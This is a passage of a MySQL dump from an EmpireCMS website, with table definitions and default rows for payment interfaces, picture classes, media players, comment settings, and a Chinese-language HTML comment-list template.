  `mid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(80) NOT NULL DEFAULT '',
  `msgtext` text NOT NULL,
  `haveread` tinyint(1) NOT NULL DEFAULT '0',
  `msgtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `to_username` varchar(30) NOT NULL DEFAULT '',
  `from_userid` int(10) unsigned NOT NULL DEFAULT '0',
  `from_username` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`),
  KEY `to_username` (`to_username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsnotice`
--

LOCK TABLES `libang_enewsnotice` WRITE;
/*!40000 ALTER TABLE `libang_enewsnotice` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsnotice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspage`
--

DROP TABLE IF EXISTS `libang_enewspage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspage` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(120) NOT NULL DEFAULT '',
  `pagetext` mediumtext NOT NULL,
  `path` varchar(255) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pagetitle` varchar(120) NOT NULL DEFAULT '',
  `pagekeywords` varchar(255) NOT NULL DEFAULT '',
  `pagedescription` varchar(255) NOT NULL DEFAULT '',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspage`
--

LOCK TABLES `libang_enewspage` WRITE;
/*!40000 ALTER TABLE `libang_enewspage` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspageclass`
--

DROP TABLE IF EXISTS `libang_enewspageclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspageclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspageclass`
--

LOCK TABLES `libang_enewspageclass` WRITE;
/*!40000 ALTER TABLE `libang_enewspageclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspageclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspagetemp`
--

DROP TABLE IF EXISTS `libang_enewspagetemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspagetemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(30) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspagetemp`
--

LOCK TABLES `libang_enewspagetemp` WRITE;
/*!40000 ALTER TABLE `libang_enewspagetemp` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspagetemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspayapi`
--

DROP TABLE IF EXISTS `libang_enewspayapi`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspayapi` (
  `payid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `paytype` varchar(20) NOT NULL DEFAULT '',
  `myorder` tinyint(4) NOT NULL DEFAULT '0',
  `payfee` varchar(10) NOT NULL DEFAULT '',
  `payuser` varchar(60) NOT NULL DEFAULT '',
  `partner` varchar(60) NOT NULL DEFAULT '',
  `paykey` varchar(120) NOT NULL DEFAULT '',
  `paylogo` varchar(200) NOT NULL DEFAULT '',
  `paysay` text NOT NULL,
  `payname` varchar(120) NOT NULL DEFAULT '',
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `payemail` varchar(120) NOT NULL DEFAULT '',
  `paymethod` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`payid`),
  UNIQUE KEY `paytype` (`paytype`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspayapi`
--

LOCK TABLES `libang_enewspayapi` WRITE;
/*!40000 ALTER TABLE `libang_enewspayapi` DISABLE KEYS */;
INSERT INTO `libang_enewspayapi` VALUES (1,'tenpay',1,'0','','','','','财付通（www.tenpay.com） - 腾讯旗下在线支付平台，通过国家权威安全认证，支持各大银行网上支付。','财付通',0,'',0),(2,'chinabank',2,'0','','','','','网银在线与中国工商银行、招商银行、中国建设银行、农业银行、民生银行等数十家金融机构达成协议。全面支持全国19家银行的信用卡及借记卡实现网上支付。（网址：http://www.chinabank.com.cn）','网银在线',0,'',0),(3,'alipay',0,'0','','','','','支付宝网站(www.alipay.com) 是国内先进的网上支付平台。','支付宝接口',0,'',1);
/*!40000 ALTER TABLE `libang_enewspayapi` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspayrecord`
--

DROP TABLE IF EXISTS `libang_enewspayrecord`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspayrecord` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `orderid` varchar(50) NOT NULL DEFAULT '',
  `money` varchar(20) NOT NULL DEFAULT '',
  `posttime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `paybz` varchar(255) NOT NULL DEFAULT '',
  `type` varchar(12) NOT NULL DEFAULT '',
  `payip` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`,`orderid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspayrecord`
--

LOCK TABLES `libang_enewspayrecord` WRITE;
/*!40000 ALTER TABLE `libang_enewspayrecord` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspayrecord` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspic`
--

DROP TABLE IF EXISTS `libang_enewspic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspic` (
  `picid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(120) NOT NULL DEFAULT '',
  `pic_url` varchar(200) NOT NULL DEFAULT '',
  `url` varchar(200) NOT NULL DEFAULT '',
  `pic_width` varchar(20) NOT NULL DEFAULT '',
  `pic_height` varchar(20) NOT NULL DEFAULT '',
  `open_pic` varchar(20) NOT NULL DEFAULT '',
  `border` tinyint(1) NOT NULL DEFAULT '0',
  `pictext` text NOT NULL,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`picid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspic`
--

LOCK TABLES `libang_enewspic` WRITE;
/*!40000 ALTER TABLE `libang_enewspic` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspicclass`
--

DROP TABLE IF EXISTS `libang_enewspicclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspicclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspicclass`
--

LOCK TABLES `libang_enewspicclass` WRITE;
/*!40000 ALTER TABLE `libang_enewspicclass` DISABLE KEYS */;
INSERT INTO `libang_enewspicclass` VALUES (1,'默认图片信息类别');
/*!40000 ALTER TABLE `libang_enewspicclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspl_1`
--

DROP TABLE IF EXISTS `libang_enewspl_1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspl_1` (
  `plid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `pubid` bigint(16) NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `sayip` varchar(20) NOT NULL DEFAULT '',
  `saytime` int(10) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `zcnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `fdnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(1) NOT NULL DEFAULT '0',
  `saytext` text NOT NULL,
  `eipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`plid`),
  KEY `id` (`id`),
  KEY `classid` (`classid`),
  KEY `pubid` (`pubid`,`checked`,`plid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspl_1`
--

LOCK TABLES `libang_enewspl_1` WRITE;
/*!40000 ALTER TABLE `libang_enewspl_1` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspl_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspl_set`
--

DROP TABLE IF EXISTS `libang_enewspl_set`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspl_set` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `pltime` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plsize` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plincludesize` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plkey_ok` tinyint(1) NOT NULL DEFAULT '0',
  `plface` text NOT NULL,
  `plfacenum` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `plgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plclosewords` text NOT NULL,
  `plf` text NOT NULL,
  `plmustf` text NOT NULL,
  `pldatatbs` text NOT NULL,
  `defpltempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pl_num` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pldeftb` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plurl` varchar(200) NOT NULL DEFAULT '',
  `plmaxfloor` smallint(5) unsigned NOT NULL DEFAULT '0',
  `plquotetemp` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspl_set`
--

LOCK TABLES `libang_enewspl_set` WRITE;
/*!40000 ALTER TABLE `libang_enewspl_set` DISABLE KEYS */;
INSERT INTO `libang_enewspl_set` VALUES (1,20,500,0,1,'||[~e.jy~]##1.gif||[~e.kq~]##2.gif||[~e.se~]##3.gif||[~e.sq~]##4.gif||[~e.lh~]##5.gif||[~e.ka~]##6.gif||[~e.hh~]##7.gif||[~e.ys~]##8.gif||[~e.ng~]##9.gif||[~e.ot~]##10.gif||',10,0,'','','',',1,',1,12,1,'/e/pl/',0,'<div class=\\\"ecomment\\\">\r\n<span class=\\\"ecommentauthor\\\">网友 [!--username--] 的原文：</span>\r\n<p class=\\\"ecommenttext\\\">[!--pltext--]</p>\r\n</div>');
/*!40000 ALTER TABLE `libang_enewspl_set` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsplayer`
--

DROP TABLE IF EXISTS `libang_enewsplayer`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsplayer` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `player` varchar(30) NOT NULL DEFAULT '',
  `filename` varchar(20) NOT NULL DEFAULT '',
  `bz` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsplayer`
--

LOCK TABLES `libang_enewsplayer` WRITE;
/*!40000 ALTER TABLE `libang_enewsplayer` DISABLE KEYS */;
INSERT INTO `libang_enewsplayer` VALUES (1,'RealPlayer','realplayer.php','RealPlayer播放器'),(2,'MediaPlayer','mediaplayer.php','MediaPlayer播放器'),(3,'FLASH','flasher.php','FLASH播放器'),(4,'FLV播放器','flver.php','FLV播放器'),(5,'HTML5Video','htmlvideo.php','HTML5的video播放标签'),(6,'JWPlayer','jwplayer.php','JWPlayer播放器'),(7,'HTML5Audio','htmlaudio.php','HTML5的audio播放标签');
/*!40000 ALTER TABLE `libang_enewsplayer` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsplf`
--

DROP TABLE IF EXISTS `libang_enewsplf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsplf` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `f` varchar(30) NOT NULL DEFAULT '',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `ftype` varchar(30) NOT NULL DEFAULT '',
  `flen` varchar(20) NOT NULL DEFAULT '',
  `ismust` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsplf`
--

LOCK TABLES `libang_enewsplf` WRITE;
/*!40000 ALTER TABLE `libang_enewsplf` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsplf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspltemp`
--

DROP TABLE IF EXISTS `libang_enewspltemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspltemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspltemp`
--

LOCK TABLES `libang_enewspltemp` WRITE;
/*!40000 ALTER TABLE `libang_enewspltemp` DISABLE KEYS */;
INSERT INTO `libang_enewspltemp` VALUES (1,'默认评论列表模板','<!DOCTYPE HTML PUBLIC \\\"-//W3C//DTD HTML 4.01 Transitional//EN\\\">\r\n<html>\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\">\r\n<title>[!--pagetitle--] - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n<style type=\\\"text/css\\\">\r\n<!--\r\nbody,Table{ color: #222; font-size: 12px; }\r\na { color: #222; text-decoration: none; }\r\na:hover { color: #f00; text-decoration: underline; }\r\nh1 { font-size:32px; font-weight: bold; }\r\nh2 { color: #1e3a9e; font-size: 25px; font-weight: bold;  }\r\n.you { color: #1f3a87; font-size: 14px; }\r\n.text { font-size: 14px; padding-left: 5px; padding-right: 5px; line-height: 20px}\r\n.re a { color: #1f3a87; }\r\n.name { color: #1f3a87; }\r\n.name a { color: #1f3a87; text-decoration: underline;}\r\n.retext { background-color: #f3f3f3; width: 100%; float: left; padding-top: 22px; padding-bottom: 22px; border-top: 1px solid #ccc; }\r\n.retext textarea { width: 535px; height: 130px; float: left; margin-left: 60px; border-top-style: inset; border-top-width: 2px; border-left-style: inset; border-left-width: 2px; }\r\n.hrLine{BORDER-BOTTOM: #807d76 1px dotted;}\r\n\r\n.ecomment {margin:0;padding:0;}\r\n.ecomment {margin-bottom:12px;overflow-x:hidden;overflow-y:hidden;padding-bottom:3px;padding-left:3px;padding-right:3px;padding-top:3px;background:#FFFFEE;padding:3px;border:solid 1px #999;}\r\n.ecommentauthor {float:left; color:#F96; font-weight:bold;}\r\n.ecommenttext {clear:left;margin:0;padding:0;}\r\n-->\r\n</style>\r\n<script src=\\\"[!--news.url--]e/data/js/ajax.js\\\"></script>\r\n</head>\r\n\r\n<body topmargin=\\\"0\\\">\r\n<table width=\\\"766\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\">\r\n  <tr>\r\n    <td width=\\\"210\\\"><a href=\\\"[!--news.url--]\\\"><img src=\\\"[!--news.url--]skin/default/images/logo.gif\\\" border=\\\"0\\\" /></a></td>\r\n    <td><h1>网友评论</h1></td>\r\n    <td><div align=\\\"right\\\"><a href=\\\"#tosaypl\\\"><strong><font color=\\\"#FF0000\\\">我也评两句</font></strong></a></div></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"766\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#222\\\">\r\n  <tr>\r\n    <td height=\\\"2\\\"></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"766\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\">\r\n  <tr> \r\n    <td height=\\\"42\\\"> \r\n      <h2>评论：<a href=\\\"[!--titleurl--]\\\" target=\\\"_blank\\\"><font color=\\\"#1e3a9e\\\">[!--title--]</font></a></h2></td>\r\n    <td><div align=\\\"right\\\"><a href=\\\"[!--titleurl--]\\\" target=\\\"_blank\\\">查看原文</a></div></td>\r\n  </tr>\r\n</table>\r\n<hr align=\\\"center\\\" width=\\\"766\\\" size=1 class=hrline>\r\n<table width=\\\"766\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#384EA3\\\">\r\n  <form action=\\\"../enews/index.php\\\" method=\\\"post\\\" name=\\\"infopfenform\\\">\r\n    <input type=\\\"hidden\\\" name=\\\"enews\\\" value=\\\"AddInfoPfen\\\" />\r\n    <input type=\\\"hidden\\\" name=\\\"classid\\\" value=\\\"[!--classid--]\\\" />\r\n    <input type=\\\"hidden\\\" name=\\\"id\\\" value=\\\"[!--id--]\\\" />\r\n    <tr> \r\n      <td width=\\\"50%\\\" height=\\\"27\\\" valign=\\\"middle\\\"><font color=\\\"#FFFFFF\\\">&nbsp;评分: \r\n        <input type=\\\"radio\\\" name=\\\"fen\\\" value=\\\"1\\\">\r\n        1分 \r\n        <input type=\\\"radio\\\" name=\\\"fen\\\" value=\\\"2\\\">\r\n        2分 \r\n        <input name=\\\"fen\\\" type=\\\"radio\\\" value=\\\"3\\\" checked>\r\n        3分 \r\n        <input type=\\\"radio\\\" name=\\\"fen\\\" value=\\\"4\\\">\r\n        4分 \r\n        <input type=\\\"radio\\\" name=\\\"fen\\\" value=\\\"5\\\">\r\n        5分 \r\n        <input type=\\\"submit\\\" name=\\\"Submit\\\" value=\\\"提交\\\">\r\n        </font></td>\r\n      <td width=\\\"50%\\\" valign=\\\"middle\\\"><div align=\\\"center\\\"><font color=\\\"#FFFFFF\\\">平均得分: \r\n          <strong><span id=\\\"pfendiv\\\">[!--pinfopfen--]</span></strong> 分，共有 <strong>[!--infopfennum--]</strong> \r\n          人参与评分</font></div></td>\r\n    </tr>\r\n  </form>\r\n</table>\r\n<table width=\\\"766\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#CCCCCC\\\">\r\n  <tr> \r\n    <td height=\\\"30\\\" bgcolor=\\\"#FFFFFF\\\"> \r\n      <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n          <td width=\\\"17%\\\">&nbsp;&nbsp;&nbsp;网友评论</td>\r\n          <td width=\\\"83%\\\"><div align=\\\"right\\\">[!--listpage--]&nbsp;&nbsp;&nbsp;</div></td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n  <tr> \r\n    <td bgcolor=\\\"#f8fcff\\\"> [!--empirenews.listtemp--] \r\n      <table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" style=\\\"word-break:break-all; word-wrap:break-all;\\\">\r\n        <tr> \r\n          <td height=\\\"30\\\"><span class=\\\"name\\\">本站网友 [!--username--]</span> <font color=\\\"#666666\\\">ip:[!--plip--]</font></td>\r\n          <td><div align=\\\"right\\\"><font color=\\\"#666666\\\">[!--pltime--] 发表</font></div></td>\r\n        </tr>\r\n        <tr valign=\\\"top\\\"> \r\n          <td height=\\\"50\\\" colspan=\\\"2\\\" class=\\\"text\\\">[!--pltext--]</td>\r\n        </tr>\r\n        <tr> \r\n          <td height=\\\"30\\\">&nbsp;</td>\r\n          <td><div align=\\\"right\\\" class=\\\"re\\\"><a href=\\\"#tosaypl\\\"[!--includelink--]>回复</a>&nbsp; \r\n              <a href=\\\"JavaScript:makeRequest(\\\'../pl/doaction.php?enews=DoForPl&plid=[!--plid--]&classid=[!--classid--]&id=[!--id--]&dopl=1&doajax=1&ajaxarea=zcpldiv[!--plid--]\\\',\\\'EchoReturnedText\\\',\\\'GET\\\',\\\'\\\');\\\">支持</a>[<span id=\\\"zcpldiv[!--plid--]\\\">[!--zcnum--]</span>]&nbsp; \r\n              <a href=\\\"JavaScript:makeRequest(\\\'../pl/doaction.php?enews=DoForPl&plid=[!--plid--]&classid=[!--classid--]&id=[!--id--]&dopl=0&doajax=1&ajaxarea=fdpldiv[!--plid--]\\\',\\\'EchoReturnedText\\\',\\\'GET\\\',\\\'\\\');\\\">反对</a>[<span id=\\\"fdpldiv[!--plid--]\\\">[!--fdnum--]</span>]\r\n            </div></td>\r\n        </tr>\r\n      </table>\r\n      <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr>\r\n          <td background=\\\"[!--news.url--]skin/default/images/plhrbg.gif\\\"></td>\r\n        </tr>\r\n      </table>\r\n      [!--empirenews.listtemp--] \r\n      <div align=\\\"right\\\"><br />\r\n        [!--listpage--]&nbsp;&nbsp;&nbsp;<br />\r\n        <br />\r\n        <font color=\\\"#FF0000\\\">网友评论仅供网友表达个人看法，并不表明本站同意其观点或证实其描述&nbsp;&nbsp;&nbsp;</font><br><br> </div></td>\r\n  </tr>\r\n  <script>\r\n  function CheckPl(obj)\r\n  {\r\n  	if(obj.saytext.value==\\\"\\\")\r\n  	{\r\n  		alert(\\\"错误，评论不能为空\\\");\r\n  		obj.saytext.focus();\r\n  		return false;\r\n  	}\r\n  	return true;\r\n  }\r\n  </script>\r\n  <form action=\\\"../pl/doaction.php\\\" method=\\\"post\\\" name=\\\"saypl\\\" id=\\\"saypl\\\" onsubmit=\\\"return CheckPl(document.saypl)\\\">\r\n  <tr id=\\\"tosaypl\\\"> \r\n    <td bgcolor=\\\"#f8fcff\\\"> <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr> \r\n            <td width=\\\"13%\\\" height=\\\"28\\\">&nbsp;&nbsp;&nbsp;<span class=\\\"you\\\">我也评两句</span></td>\r\n            <td valign=\\\"middle\\\">用户名： \r\n              <input name=\\\"username\\\" type=\\\"text\\\" id=\\\"username\\\" size=\\\"12\\\" value=\\\"[!--lusername--]\\\" />\r\n            密码： \r\n            <input name=\\\"password\\\" type=\\\"password\\\" id=\\\"password\\\" size=\\\"12\\\" value=\\\"[!--lpassword--]\\\" />\r\n            验证码： \r\n            <input name=\\\"key\\\" type=\\\"text\\\" id=\\\"key\\\" size=\\\"6\\\" />\r\n              <img src=\\\"[!--key.url--]\\\" align=\\\"middle\\\" name=\\\"plKeyImg\\\" id=\\\"plKeyImg\\\" onclick=\\\"plKeyImg.src=\\\'[!--news.url--]e/ShowKey/?v=pl&t=\\\'+Math.random()\\\" title=\\\"看不清楚,点击刷新\\\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/register/\\\" target=\\\"_blank\\\">还没有注册？</a></td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>\r\n  <tr> \r\n    <td bgcolor=\\\"#f8fcff\\\"> <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" class=\\\"retext\\\">\r\n        <tr> \r\n          <td width=\\\"78%\\\"><div align=\\\"center\\\"> \r\n              <textarea name=\\\"saytext\\\" cols=\\\"58\\\" rows=\\\"6\\\" id=\\\"saytext\\\"></textarea>\r\n            </div></td>\r\n          <td width=\\\"22%\\\" rowspan=\\\"2\\\"> <div align=\\\"center\\\">\r\n              <input name=\\\"nomember\\\" type=\\\"checkbox\\\" id=\\\"nomember\\\" value=\\\"1\\\" checked=\\\"checked\\\" />\r\n                匿名发表<br>\r\n                <br />\r\n              <input name=\\\"imageField\\\" type=\\\"submit\\\" id=\\\"imageField\\\" value=\\\" 提 交 \\\" />\r\n            </div></td>\r\n        </tr>\r\n        <tr> \r\n          <td><div align=\\\"center\\\"> \r\n              <script src=\\\"[!--news.url--]d/js/js/plface.js\\\"></script>\r\n            </div></td>\r\n        </tr>\r\n      </table> </td>\r\n  </tr>\r\n  <input name=\\\"id\\\" type=\\\"hidden\\\" id=\\\"id\\\" value=\\\"[!--id--]\\\" />\r\n  <input name=\\\"classid\\\" type=\\\"hidden\\\" id=\\\"classid\\\" value=\\\"[!--classid--]\\\" />\r\n  <input name=\\\"enews\\\" type=\\\"hidden\\\" id=\\\"enews\\\" value=\\\"AddPl\\\" />\r\n  <input name=\\\"repid\\\" type=\\\"hidden\\\" id=\\\"repid\\\" value=\\\"0\\\" />\r\n  </form>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>',1);
/*!40000 ALTER TABLE `libang_enewspltemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspostdata`
--

DROP TABLE IF EXISTS `libang_enewspostdata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspostdata` (
  `postid` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `rnd` varchar(32) NOT NULL DEFAULT '',
  `postdata` varchar(255) NOT NULL DEFAULT '',
  `ispath` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`postid`),
  KEY `rnd` (`rnd`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspostdata`
--

LOCK TABLES `libang_enewspostdata` WRITE;
/*!40000 ALTER TABLE `libang_enewspostdata` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspostdata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspostserver`
--

DROP TABLE IF EXISTS `libang_enewspostserver`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspostserver` (
  `pid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `pname` varchar(60) NOT NULL DEFAULT '',
  `purl` varchar(255) NOT NULL DEFAULT '',
  `ptype` tinyint(1) NOT NULL DEFAULT '0',
  `ftphost` varchar(255) NOT NULL DEFAULT '',
  `ftpport` varchar(20) NOT NULL DEFAULT '',
  `ftpusername` varchar(120) NOT NULL DEFAULT '',
  `ftppassword` varchar(120) NOT NULL DEFAULT '',
  `ftppath` varchar(255) NOT NULL DEFAULT '',
  `ftpmode` tinyint(1) NOT NULL DEFAULT '0',
  `ftpssl` tinyint(1) NOT NULL DEFAULT '0',
  `ftppasv` tinyint(1) NOT NULL DEFAULT '0',
  `ftpouttime` smallint(5) unsigned NOT NULL DEFAULT '0',
  `lastposttime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`),
  KEY `ptype` (`ptype`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
